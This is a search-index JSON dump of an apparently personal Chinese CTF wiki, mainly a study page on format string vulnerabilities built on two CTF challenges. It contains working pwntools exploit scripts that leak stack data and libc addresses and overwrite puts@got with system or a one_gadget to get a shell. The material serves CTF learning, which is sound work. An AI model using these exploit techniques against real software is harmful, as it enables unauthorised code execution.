{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5173\u4e8ewiki ___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ Site Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 Chart Email:skye437231@gmail.com","title":"Home"},{"location":"#wiki","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/","title":"\u5173\u4e8ewiki"},{"location":"#site","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"Site"},{"location":"#chart","text":"Email:skye437231@gmail.com","title":"Chart"},{"location":"about/","text":"___________ _____.___. __ __.__ ____ __.__ / _____/ | _\\__ | | ____ / \\ / \\__| |/ _|__| \\_____ \\| |/ // | |/ __ \\ \\ \\/\\/ / | < | | / \\ < \\____ \\ ___/ \\ /| | | \\| | /_______ /__|_ \\/ ______|\\___ > \\__/\\ / |__|____|__ \\__| \\/ \\/\\/ \\/ \\/ \\/ \u6e23\u6e23\u81ea\u8ff0 \u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002 \u95e8\u6237\u7f51\u7ad9 Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231 \u8054\u7cfb\u65b9\u5f0f Email:skye437231@gmail.com","title":"About"},{"location":"about/#_1","text":"\u5e7f\u5dde\u8fa3\u9e21\u4e8c\u672c\u7684\u5927\u4e8c\u751f\uff0c\u8bf7\u5404\u4f4d\u5927\u4f6c\u591a\u591a\u6307\u6559\u3002 Blog\u5199\u4e86\u4ec0\u4e48\u5c31\u53d1\u4ec0\u4e48\uff0c\u5185\u5bb9\u6e23\u4e14\u6742\u3002\u77e5\u8bc6\u6574\u7406\u5728 WiKi \u3002","title":"\u6e23\u6e23\u81ea\u8ff0"},{"location":"about/#_2","text":"Blog: SkYe's Blog WiKi: SkYe's WiKi Github: @skyedai910 CSDN: @SkYe231","title":"\u95e8\u6237\u7f51\u7ad9"},{"location":"about/#_3","text":"Email:skye437231@gmail.com","title":"\u8054\u7cfb\u65b9\u5f0f"},{"location":"knowledge_point_%26_title_index/","text":"","title":"\u77e5\u8bc6\u70b9&\u9898\u76ee\u7d22\u5f15"},{"location":"fmtstr/fmtstr_example/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50 \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u539f\u7406 \u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 \u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002 \u4f8b\u5b50 \u786e\u5b9a\u4fdd\u62a4 \u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017-UIUCTF-pwn200-GoodLuck git:(master) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002 \u5206\u6790\u7a0b\u5e8f \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0; j <= 21; ++j ) { v5 = format[j]; if ( !v5 || v11[j] != v5 ) { puts(\"You answered:\"); printf(format); puts(\"\\nBut that was totally wrong lol get rekt\"); fflush(_bss_start); result = 0; goto LABEL_11; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f \u8f93\u5165\u4e00\u957f\u4e32 %p \u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740 \u3002 shell $ ./goodluck what's the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 \uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002 \u5229\u7528\u7a0b\u5e8f #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # \u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF('./goodluck') if args['REMOTE']: sh = remote('pwn.sniperoj.cn', 30017) else: sh = process('./goodluck') payload = \"%9$s\" print payload ##gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() hijack GOT \u539f\u7406 \u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset \u4f8b\u5b50 \u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u5982\u4e0b \u279c 2016-CCTF-pwn3 git:(master) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002 \u5206\u6790\u7a0b\u5e8f \u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file() { char dest; // [sp+1Ch] [bp-FCh]@5 char s1; // [sp+E4h] [bp-34h]@1 char *i; // [sp+10Ch] [bp-Ch]@3 printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 0x28);//\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return printf(&dest);//\u8f93\u51fadest\u5185\u5bb9 } } return printf(&dest); } \u6f0f\u6d1e\u5229\u7528\u601d\u8def \u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f \u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive() exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_1","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#64","text":"","title":"64 \u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"fmtstr/fmtstr_example/#_2","text":"\u5176\u5b9e 64 \u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c 32 \u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc7 64 \u4f4d\u51fd\u6570\u7684\u524d 6 \u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f \u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_3","text":"","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_4","text":"\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5 2017 \u5e74\u7684 UIUCTF \u4e2d pwn200 GoodLuck \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2a flag.txt \u6587\u4ef6\u3002 \u279c 2017-UIUCTF-pwn200-GoodLuck git:(master) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86 Canary\u3001NX \u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206 RELRO \u4fdd\u62a4\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_5","text":"\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e for ( j = 0; j <= 21; ++j ) { v5 = format[j]; if ( !v5 || v11[j] != v5 ) { puts(\"You answered:\"); printf(format); puts(\"\\nBut that was totally wrong lol get rekt\"); fflush(_bss_start); result = 0; goto LABEL_11; } } \u53ef\u4ee5\u770b\u5230 flag \u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a 5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a 4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a 64 \u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d 6 \u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt \u5b57\u7b26\u4e32\u5b58\u50a8\u5728 RDI \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5 fmt \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a 10\u3002\u800c fmt \u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684 order \u4e3a fmt \u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230 flag \u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528 https://github.com/scwuaptx/Pwngdb \u4e2d\u7684 fmtarg \u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002 gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987b break \u5728 printf \u5904\u3002 \u6765\u81ea resery \u5e08\u5085\u6ce8\u89e3\uff1a \u8fd9\u91cc\u7684 10 \u662f\u7531 5+5 \u5f97\u5230\u7684\uff0c\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e24\u4e2a 5 \u662f\u4ece\u54ea\u91cc\u7684\u5f97\u5230\u7684\uff0c\u6211\u6765\u89e3\u91ca\u4e00\u4e0b\uff0c\u524d\u9762\u7684 5\uff1a\u7531\u4e8e 64 \u4e3a\u7a0b\u5e8f\uff0c\u524d 64 \u4e2a\u53c2\u6570\u662f\u5b58\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff0c\u5206\u522b\u662f rdi\uff0crsi\uff0crcx\uff0crdx\uff0cr8\uff0cr9\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u50a8\u5728 rdi \u4e2d\u7684\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u504f\u79fb\u5c31\u5e94\u8be5\u662f 5+flag \u5728\u6808\u4e2d\u7684\u504f\u79fb\uff0c\u5728\u6808\u4e2d\u7684\u504f\u79fb\u5c31\u5f88\u597d\u7406\u89e3\u4e86\u5c31\u662f 5\uff0c\u6240\u4ee5 flag \u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 10 \u6ce8\u89e3 \u6211\u5b89\u88c5\u7684 Pwndbg \u5e76\u6ca1\u6709 fmtarg \uff0c\u53ef\u80fd\u662f\u7248\u672c\u4e0d\u5bf9\uff0c\u5982\u679c\u9700\u8981\u5b89\u88c5\u4e00\u4e0b gef \u63d2\u4ef6\u3002 \u4e24\u4e2a\u4f5c\u8005\u90fd\u89e3\u91ca\u4e86\u504f\u79fb 10 \u662f\u600e\u4e48\u8ba1\u7b97\u6765\uff0c\u4f46\u6211\u66f4\u559c\u6b22\u7684\u65b9\u6cd5\u662f \u8f93\u5165\u4e00\u957f\u4e32 %p 